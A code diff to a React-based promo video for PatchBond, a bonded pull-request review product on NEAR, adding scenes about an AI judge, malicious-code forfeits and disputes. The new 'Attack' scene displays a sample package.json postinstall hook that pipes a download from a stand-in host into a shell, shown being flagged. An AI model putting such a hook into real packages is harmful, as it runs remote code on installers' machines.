@@ -1,4 +1,4 @@
-// The short cut (~47 s): beat-synced to an original 124 BPM track (gen-music.ts), narrated by a
+// The short cut (~53 s): beat-synced to an original 124 BPM track (gen-music.ts), narrated by a
 // neural voice (gen-voice.mjs), with burned-in captions for muted autoplay. Product shots are real
 // recordings of the running app (record.ts); receipts are real testnet transactions (fetch-txs.ts).
 
@@ -270,14 +270,14 @@ function Judge() {
     ["CI", C.brand],
     ["Invented code", C.danger],
     ["Claims vs diff", C.warn],
-    ["Who was assigned", C.warn],
+    ["Malicious code", C.danger],
     ["Prompt injection", C.danger],
   ] as const;
   return (
     <AbsoluteFill>
       <Sequence durationInFrames={half}>
         <Whip>
-          <Camera src="judge" startSec={1.6} rate={2} to={{ x: 960, y: 300, z: 1.45 }} />
+          <Camera src="judge" startSec={4.1} rate={2} to={{ x: 960, y: 300, z: 1.45 }} />
           <Vignette />
         </Whip>
       </Sequence>
@@ -304,14 +304,94 @@ function Verify() {
   return (
     <AbsoluteFill>
       <Whip>
-        <Camera src="judge" startSec={25.2} rate={1.15} zoomFrom={1.3} to={{ x: 817, y: 470, z: 1.62 }} delay={0} />
+        <Camera src="judge" startSec={25.4} rate={1.15} zoomFrom={1.3} to={{ x: 817, y: 470, z: 1.62 }} delay={0} />
         <Vignette />
+        <Pop at={2} style={{ position: "absolute", left: 90, bottom: 170 }}>
+          <Chip>
+            <b>LIVE</b> · signed in a TEE on NEAR AI Cloud · <span style={{ fontFamily: mono, fontSize: 24, color: C.ink2 }}>glm-5.3-flash</span>
+          </Chip>
+        </Pop>
         <div style={{ position: "absolute", right: 110, top: 120, transform: `rotate(-8deg) scale(${0.3 + 0.7 * stamp})`, opacity: Math.min(1, stamp * 1.4) }}>
           <div style={{ border: `6px solid ${C.brand}`, color: C.brand, borderRadius: 22, padding: "18px 34px", fontSize: 54, fontWeight: 900, letterSpacing: "0.06em", background: "rgba(11,13,16,.8)", boxShadow: `0 0 60px ${C.brand}55` }}>
             ✓ VERIFIED
             <div style={{ fontSize: 22, fontWeight: 600, letterSpacing: "0.02em", color: C.ink2, marginTop: 4 }}>in your browser · no trust needed</div>
           </div>
         </div>
+      </Whip>
+    </AbsoluteFill>
+  );
+}
+
+/** A poisoned install hook in a diff: the scan flags it and the forfeit stamps down. */
+function Attack() {
+  const frame = useCurrentFrame();
+  const flag = interpolate(frame, [f(BEAT * 0.9), f(BEAT * 1.3)], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
+  const stamp = spring({ frame: frame - f(BEAT * 2.1), fps: FPS, config: { damping: 9, stiffness: 240 } });
+  const lines: [string, string][] = [
+    [" ", '  "scripts": {'],
+    [" ", '    "build": "tsc -p .",'],
+    ["+", '    "postinstall": "curl -s https://x.example/p.sh | sh",'],
+    [" ", "  },"],
+  ];
+  return (
+    <AbsoluteFill>
+      <Backdrop hue={C.danger} intensity={0.9} />
+      <Whip>
+        <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
+          <div style={{ width: 1400, background: C.panel, border: `1.5px solid ${C.line}`, borderRadius: 26, overflow: "hidden", boxShadow: "0 40px 120px -30px rgba(0,0,0,.9)" }}>
+            <div style={{ padding: "18px 30px", borderBottom: `1px solid ${C.line}`, fontFamily: mono, fontSize: 24, color: C.faint }}>package.json · PR #4127</div>
+            <div style={{ padding: "22px 0", fontFamily: mono, fontSize: 34, lineHeight: 1.75 }}>
+              {lines.map(([sign, text], i) => {
+                const bad = sign === "+";
+                return (
+                  <div key={i} style={{ padding: "0 30px", whiteSpace: "pre", color: bad ? C.ink : C.ink2, background: bad ? `rgba(248,113,113,${0.08 + 0.17 * flag})` : undefined, boxShadow: bad ? `inset 6px 0 0 rgba(248,113,113,${flag})` : undefined }}>
+                    <span style={{ color: bad ? C.danger : C.faint }}>{sign} </span>
+                    {text}
+                  </div>
+                );
+              })}
+            </div>
+          </div>
+          <div style={{ display: "flex", gap: 18, marginTop: 34, opacity: flag }}>
+            <Chip tone={C.danger}>install hook that runs downloaded code</Chip>
+            <Chip tone={C.danger}>pipes a download into a shell</Chip>
+          </div>
+        </AbsoluteFill>
+        <div style={{ position: "absolute", right: 150, top: 120, transform: `rotate(7deg) scale(${0.3 + 0.7 * stamp})`, opacity: Math.min(1, stamp * 1.4) }}>
+          <div style={{ border: `6px solid ${C.danger}`, color: C.danger, borderRadius: 22, padding: "16px 32px", fontSize: 56, fontWeight: 900, letterSpacing: "0.06em", background: "rgba(11,13,16,.85)", boxShadow: `0 0 60px ${C.danger}55` }}>
+            FORFEITED
+            <div style={{ fontSize: 22, fontWeight: 600, letterSpacing: "0.02em", color: C.ink2, marginTop: 2 }}>malicious code · still challengeable</div>
+          </div>
+        </div>
+      </Whip>
+    </AbsoluteFill>
+  );
+}
+
+/** Contributors are protected too: a maintainer's forfeit is a proposal, disputable for free. */
+function Fair() {
+  const steps = [
+    { n: "48 h", t: "a maintainer's forfeit is only a proposal", tone: C.warn },
+    { n: "$0", t: "to dispute it — a stronger AI re-judges", tone: C.brand },
+    { n: "+1 bond", t: "paid to you from their vault if they were wrong", tone: C.brand },
+  ];
+  return (
+    <AbsoluteFill>
+      <Backdrop intensity={1} />
+      <Whip>
+        <AbsoluteFill style={{ alignItems: "center", justifyContent: "center" }}>
+          <Kinetic words={["Maintainers", "can't", "steal", "it", "either."]} accent={[2]} size={104} startBeat={0.1} style={{ justifyContent: "center", maxWidth: 1600 }} />
+          <div style={{ display: "flex", gap: 28, marginTop: 70 }}>
+            {steps.map((x, i) => (
+              <Pop key={x.n} at={f(BEAT * (2.6 + i * 0.7))}>
+                <div style={{ width: 470, background: C.panel, border: `1.5px solid ${x.tone}44`, borderRadius: 26, padding: "30px 32px", boxShadow: `0 30px 80px -30px ${x.tone}55` }}>
+                  <div style={{ fontSize: 76, fontWeight: 800, letterSpacing: "-0.04em", color: x.tone, lineHeight: 1 }}>{x.n}</div>
+                  <div style={{ fontSize: 28, color: C.ink2, marginTop: 14, lineHeight: 1.35 }}>{x.t}</div>
+                </div>
+              </Pop>
+            ))}
+          </div>
+        </AbsoluteFill>
       </Whip>
     </AbsoluteFill>
   );
@@ -364,7 +444,7 @@ function Chain() {
 
 function Grid() {
   const cells = [
-    { src: "pay", start: 1, label: "One tap to pay — gasless", to: { x: 1180, y: 420, z: 1.25 } },
+    { src: "pay", start: 1, label: "One tap — USDC or NEAR", to: { x: 1180, y: 420, z: 1.25 } },
     { src: "agents", start: 1.2, label: "Agents: capped wallets", to: { x: 1150, y: 300, z: 1.3 } },
     { src: "maintainers", start: 0.8, label: "Maintainers: link & withdraw", to: { x: 960, y: 420, z: 1.2 } },
     { src: "hero", start: 6, label: "Live bond pricing", to: { x: 1265, y: 450, z: 1.6 } },
@@ -391,7 +471,7 @@ function Grid() {
 }
 
 function Near() {
-  const items = ["NEAR AI Cloud · TEE", "Rust contract", "NEP-141 USDC", "Function-call keys", "Meta tx · NEP-366", "NEP-413 signatures", "NEAR Intents", "Sputnik DAO"];
+  const items = ["NEAR AI Cloud · TEE", "Rust contract", "USDC & wNEAR", "Function-call keys", "Meta tx · NEP-366", "NEP-413 signatures", "NEAR Intents", "Sputnik DAO"];
   return (
     <AbsoluteFill>
       <Backdrop intensity={1.1} />
@@ -431,7 +511,7 @@ function Close() {
         </Pop>
         <Pop at={f(BEAT * 6.5)} style={{ marginTop: 26 }}>
           <div style={{ fontFamily: mono, fontSize: 32, color: C.ink2 }}>github.com/PatchBond/patchbond</div>
-          <div style={{ fontSize: 22, color: C.faint, marginTop: 12 }}>Live on NEAR testnet · MIT · No token</div>
+          <div style={{ fontSize: 22, color: C.faint, marginTop: 12 }}>Live on NEAR testnet · verdicts signed in a NEAR AI TEE · MIT · No token</div>
         </Pop>
       </AbsoluteFill>
     </AbsoluteFill>
@@ -475,7 +555,9 @@ const SCENES: Record<string, () => ReactNode> = {
   bond: () => <Bond />,
   spam: () => <Spam />,
   judge: () => <Judge />,
+  attack: () => <Attack />,
   verify: () => <Verify />,
+  fair: () => <Fair />,
   chain: () => <Chain />,
   grid: () => <Grid />,
   near: () => <Near />,
